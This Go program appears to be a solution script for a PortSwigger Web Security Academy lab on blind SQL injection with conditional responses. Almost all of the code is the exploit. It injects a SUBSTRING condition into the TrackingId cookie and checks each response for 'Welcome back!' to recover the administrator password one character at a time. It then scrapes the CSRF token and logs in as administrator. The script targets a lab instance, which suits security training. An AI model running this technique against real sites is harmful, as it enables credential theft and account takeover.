// https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"regexp"
	"strconv"
	"strings"
	"time"
)

func main() {
	err := solve()
	if err != nil {
		log.Fatalln(err)
	}
}

func solve() error {
	client, err := newClient()
	if err != nil {
		return err
	}

	u := "https://0ae7002803cd1548c0f8054d0076004f.web-security-academy.net"
	loginUrl := u + "/login"

	trackingIdCookie, err := trackingIdCookie(u, client)
	if err != nil {
		return err
	}

	pass, err := adminPassword(u, trackingIdCookie, client)
	if err != nil {
		return err
	}
	fmt.Println("Admin password:", pass)

	csrfToken, err := parseCSRFToken(loginUrl, client)
	if err != nil {
		return err
	}

	return login(loginUrl, "administrator", pass, csrfToken, client)
}

func trackingIdCookie(u string, client *http.Client) (*http.Cookie, error) {
	resp, err := client.Get(u)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	if resp.StatusCode/100 != 2 {
		return nil, fmt.Errorf("Status: %v", resp.Status)
	}

	u2, err := url.Parse(u)
	if err != nil {
		return nil, err
	}

	cookies := client.Jar.Cookies(u2)
	for _, c := range cookies {
		fmt.Println(c)
		if c.Name == "TrackingId" {
			return c, nil
		}
	}

	return nil, fmt.Errorf("TrackingId cookie not found")
}

var alphaNumChars = "0123456789abcdefghijklmnopqrstuvwxyz"

func adminPassword(u string, trackingIdCookie *http.Cookie, client *http.Client) (string, error) {
	u2, err := url.Parse(u)
	if err != nil {
		return "", err
	}

	pass := &strings.Builder{}
	for i := 1; i <= 20; i++ { // binary search would be faster
		for _, c := range alphaNumChars {
			var trCookie http.Cookie
			trCookie = *trackingIdCookie

			// clear
			trCookie.Value = ""
			trCookie.Expires = time.Unix(0, 0)
			client.Jar.SetCookies(u2, []*http.Cookie{&trCookie})

			trCookie.Value = trackingIdCookie.Value + "' AND (SELECT SUBSTRING(password," + strconv.Itoa(i) + ",1) FROM users WHERE username='administrator')='" + string(c)
			fmt.Println(trCookie.Value)

			req, err := http.NewRequest("GET", u, nil)
			if err != nil {
				return "", err
			}

			// to avoid adding double quotes around the value
			req.Header.Add("Cookie", trCookie.Name+"="+trCookie.Value)

			resp, err := client.Do(req)
			if err != nil {
				return "", err
			}
			defer resp.Body.Close()
			if resp.StatusCode/100 != 2 {
				return "", fmt.Errorf("Status: %v", resp.Status)
			}

			body, err := io.ReadAll(resp.Body)
			if err != nil {
				return "", err
			}
			//fmt.Println(string(body))

			if strings.Contains(string(body), "Welcome back!") {
				_, err := pass.WriteRune(c)
				if err != nil {
					return "", err
				}
				fmt.Println("found:", i, string(c))
				break
			}
		}
	}
	return pass.String(), nil
}

var csrfRE *regexp.Regexp = regexp.MustCompile(`name="csrf" value="([^"]+)"`)

func parseCSRFToken(url string, client *http.Client) (string, error) {
	resp, err := client.Get(url)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	if resp.StatusCode/100 != 2 {
		return "", fmt.Errorf("Status: %v", resp.Status)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	//fmt.Println(string(body))

	return string(csrfRE.FindSubmatch(body)[1]), nil
}

func login(u, username, password, csrfToken string, client *http.Client) error {
	resp, err := client.PostForm(u, url.Values{"username": {"administrator"}, "password": {password}, "csrf": {csrfToken}})
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode/100 != 2 {
		return fmt.Errorf("Status: %v", resp.Status)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return err
	}
	_, err = fmt.Println(string(body))
	return err
}

func newClient() (*http.Client, error) {
	jar, err := cookiejar.New(nil)
	if err != nil {
		return nil, err
	}

	//u2, _ := url.Parse("http://127.0.0.1:8888")

	return &http.Client{
		Jar: jar,
		//Transport: &http.Transport{Proxy: http.ProxyURL(u2)},
	}, nil
}
